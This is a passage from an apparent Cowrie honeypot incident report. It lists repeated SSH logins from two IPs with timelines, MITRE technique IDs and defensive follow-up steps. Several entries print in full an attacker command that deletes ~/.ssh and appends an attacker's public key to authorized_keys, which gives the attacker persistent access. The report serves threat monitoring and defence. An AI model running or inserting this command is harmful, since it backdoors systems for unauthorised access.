|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:52 |
| **Last Seen** | 2026-06-09 16:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:52:58` | `cowrie.session.connect` |
| `2026-06-09 16:52:58` | `cowrie.client.version` |
| `2026-06-09 16:52:58` | `cowrie.client.kex` |
| `2026-06-09 16:53:00` | `cowrie.login.success` |
| `2026-06-09 16:53:00` | `cowrie.session.params` |
| `2026-06-09 16:53:00` | `cowrie.command.input` |
| `2026-06-09 16:53:00` | `cowrie.command.failed` |
| `2026-06-09 16:53:00` | `cowrie.log.closed` |
| `2026-06-09 16:53:01` | `cowrie.session.params` |
| `2026-06-09 16:53:01` | `cowrie.command.input` |
| `2026-06-09 16:53:01` | `cowrie.session.file_download` |
| `2026-06-09 16:53:01` | `cowrie.log.closed` |
| `2026-06-09 16:53:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e7e62bdfb7a

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:53 |
| **Last Seen** | 2026-06-09 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:53:04` | `cowrie.session.connect` |
| `2026-06-09 16:53:04` | `cowrie.client.version` |
| `2026-06-09 16:53:05` | `cowrie.client.kex` |
| `2026-06-09 16:53:06` | `cowrie.login.success` |
| `2026-06-09 16:53:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea64befbd3cd

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 16:53 |
| **Last Seen** | 2026-06-09 16:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:53:49` | `cowrie.session.connect` |
| `2026-06-09 16:53:49` | `cowrie.client.version` |
| `2026-06-09 16:53:49` | `cowrie.client.kex` |
| `2026-06-09 16:53:50` | `cowrie.login.success` |
| `2026-06-09 16:53:51` | `cowrie.session.params` |
| `2026-06-09 16:53:51` | `cowrie.command.input` |
| `2026-06-09 16:53:51` | `cowrie.command.failed` |
| `2026-06-09 16:53:51` | `cowrie.log.closed` |
| `2026-06-09 16:53:51` | `cowrie.session.params` |
| `2026-06-09 16:53:51` | `cowrie.command.input` |
| `2026-06-09 16:53:52` | `cowrie.session.file_download` |
| `2026-06-09 16:53:52` | `cowrie.log.closed` |
| `2026-06-09 16:53:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d1b737b5bf0

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 16:53 |
| **Last Seen** | 2026-06-09 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:53:54` | `cowrie.session.connect` |
| `2026-06-09 16:53:54` | `cowrie.client.version` |
| `2026-06-09 16:53:55` | `cowrie.client.kex` |
| `2026-06-09 16:53:55` | `cowrie.login.success` |
| `2026-06-09 16:53:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daed7e536116

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 16:57 |
| **Last Seen** | 2026-06-09 16:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:57:40` | `cowrie.session.connect` |
| `2026-06-09 16:57:40` | `cowrie.client.version` |
| `2026-06-09 16:57:40` | `cowrie.client.kex` |
| `2026-06-09 16:57:41` | `cowrie.login.success` |
| `2026-06-09 16:57:41` | `cowrie.session.params` |
| `2026-06-09 16:57:41` | `cowrie.command.input` |
| `2026-06-09 16:57:41` | `cowrie.command.failed` |
| `2026-06-09 16:57:42` | `cowrie.log.closed` |
| `2026-06-09 16:57:42` | `cowrie.session.params` |
| `2026-06-09 16:57:42` | `cowrie.command.input` |
| `2026-06-09 16:57:42` | `cowrie.session.file_download` |
| `2026-06-09 16:57:42` | `cowrie.log.closed` |
| `2026-06-09 16:57:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb5fba34b302

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 16:57 |
| **Last Seen** | 2026-06-09 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:57:45` | `cowrie.session.connect` |
| `2026-06-09 16:57:45` | `cowrie.client.version` |
| `2026-06-09 16:57:45` | `cowrie.client.kex` |
| `2026-06-09 16:57:46` | `cowrie.login.success` |
| `2026-06-09 16:57:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62a5600a1c25

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 17:00 |
| **Last Seen** | 2026-06-09 17:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:00:11` | `cowrie.session.connect` |
| `2026-06-09 17:00:11` | `cowrie.client.version` |
| `2026-06-09 17:00:11` | `cowrie.client.kex` |
| `2026-06-09 17:00:12` | `cowrie.login.success` |
| `2026-06-09 17:00:13` | `cowrie.session.params` |
| `2026-06-09 17:00:13` | `cowrie.command.input` |
| `2026-06-09 17:00:13` | `cowrie.command.failed` |
| `2026-06-09 17:00:13` | `cowrie.log.closed` |
| `2026-06-09 17:00:13` | `cowrie.session.params` |
| `2026-06-09 17:00:13` | `cowrie.command.input` |
| `2026-06-09 17:00:13` | `cowrie.session.file_download` |
| `2026-06-09 17:00:13` | `cowrie.log.closed` |
| `2026-06-09 17:00:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2139d29a441

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 17:00 |
| **Last Seen** | 2026-06-09 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:00:16` | `cowrie.session.connect` |
| `2026-06-09 17:00:16` | `cowrie.client.version` |
| `2026-06-09 17:00:16` | `cowrie.client.kex` |
| `2026-06-09 17:00:17` | `cowrie.login.success` |
| `2026-06-09 17:00:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29bfb4c0f863

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 17:04 |
| **Last Seen** | 2026-06-09 17:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:04:07` | `cowrie.session.connect` |
| `2026-06-09 17:04:07` | `cowrie.client.version` |
| `2026-06-09 17:04:08` | `cowrie.client.kex` |
| `2026-06-09 17:04:08` | `cowrie.login.success` |
| `2026-06-09 17:04:09` | `cowrie.session.params` |
| `2026-06-09 17:04:09` | `cowrie.command.input` |
| `2026-06-09 17:04:09` | `cowrie.command.failed` |
| `2026-06-09 17:04:09` | `cowrie.log.closed` |
| `2026-06-09 17:04:10` | `cowrie.session.params` |
| `2026-06-09 17:04:10` | `cowrie.command.input` |
| `2026-06-09 17:04:10` | `cowrie.session.file_download` |
| `2026-06-09 17:04:10` | `cowrie.log.closed` |
| `2026-06-09 17:04:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa86997d959f

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 17:04 |
| **Last Seen** | 2026-06-09 17:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:04:12` | `cowrie.session.connect` |
| `2026-06-09 17:04:12` | `cowrie.client.version` |
| `2026-06-09 17:04:13` | `cowrie.client.kex` |
| `2026-06-09 17:04:14` | `cowrie.login.success` |
| `2026-06-09 17:04:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5680e11decb9

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 17:12 |
| **Last Seen** | 2026-06-09 17:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:12:01` | `cowrie.session.connect` |
| `2026-06-09 17:12:01` | `cowrie.client.version` |
| `2026-06-09 17:12:01` | `cowrie.client.kex` |
| `2026-06-09 17:12:02` | `cowrie.login.success` |
| `2026-06-09 17:12:02` | `cowrie.session.params` |
| `2026-06-09 17:12:02` | `cowrie.command.input` |
| `2026-06-09 17:12:02` | `cowrie.command.failed` |
| `2026-06-09 17:12:03` | `cowrie.log.closed` |
| `2026-06-09 17:12:03` | `cowrie.session.params` |
| `2026-06-09 17:12:03` | `cowrie.command.input` |
| `2026-06-09 17:12:03` | `cowrie.session.file_download` |
| `2026-06-09 17:12:03` | `cowrie.log.closed` |
| `2026-06-09 17:12:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28bbb8147640

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 17:12 |
| **Last Seen** | 2026-06-09 17:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:12:06` | `cowrie.session.connect` |
| `2026-06-09 17:12:06` | `cowrie.client.version` |
| `2026-06-09 17:12:06` | `cowrie.client.kex` |
| `2026-06-09 17:12:07` | `cowrie.login.success` |
| `2026-06-09 17:12:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef2c67d56fe9

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 17:15 |
| **Last Seen** | 2026-06-09 17:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:15:49` | `cowrie.session.connect` |
| `2026-06-09 17:15:49` | `cowrie.client.version` |
| `2026-06-09 17:15:50` | `cowrie.client.kex` |
| `2026-06-09 17:15:50` | `cowrie.login.success` |
| `2026-06-09 17:15:51` | `cowrie.session.params` |
| `2026-06-09 17:15:51` | `cowrie.command.input` |
| `2026-06-09 17:15:51` | `cowrie.command.failed` |
| `2026-06-09 17:15:51` | `cowrie.log.closed` |
| `2026-06-09 17:15:52` | `cowrie.session.params` |
| `2026-06-09 17:15:52` | `cowrie.command.input` |
| `2026-06-09 17:15:52` | `cowrie.session.file_download` |
| `2026-06-09 17:15:52` | `cowrie.log.closed` |
| `2026-06-09 17:15:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb74eb4c50f5

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 17:15 |
| **Last Seen** | 2026-06-09 17:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:15:54` | `cowrie.session.connect` |
| `2026-06-09 17:15:54` | `cowrie.client.version` |
| `2026-06-09 17:15:55` | `cowrie.client.kex` |
| `2026-06-09 17:15:55` | `cowrie.login.success` |
| `2026-06-09 17:15:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3b4a5889b32

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 17:17 |
| **Last Seen** | 2026-06-09 17:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:17:46` | `cowrie.session.connect` |
| `2026-06-09 17:17:46` | `cowrie.client.version` |
| `2026-06-09 17:17:46` | `cowrie.client.kex` |
| `2026-06-09 17:17:47` | `cowrie.login.success` |
| `2026-06-09 17:17:47` | `cowrie.session.params` |
| `2026-06-09 17:17:47` | `cowrie.command.input` |
| `2026-06-09 17:17:47` | `cowrie.command.failed` |
| `2026-06-09 17:17:47` | `cowrie.log.closed` |
| `2026-06-09 17:17:48` | `cowrie.session.params` |
| `2026-06-09 17:17:48` | `cowrie.command.input` |
| `2026-06-09 17:17:48` | `cowrie.session.file_download` |
| `2026-06-09 17:17:48` | `cowrie.log.closed` |
| `2026-06-09 17:17:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-720bf6096f2b

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 17:17 |
| **Last Seen** | 2026-06-09 17:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:17:51` | `cowrie.session.connect` |
| `2026-06-09 17:17:51` | `cowrie.client.version` |
| `2026-06-09 17:17:51` | `cowrie.client.kex` |
| `2026-06-09 17:17:52` | `cowrie.login.success` |
| `2026-06-09 17:17:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8395e31b0a86

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 17:19 |
| **Last Seen** | 2026-06-09 17:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 17:19:37` | `cowrie.session.connect` |
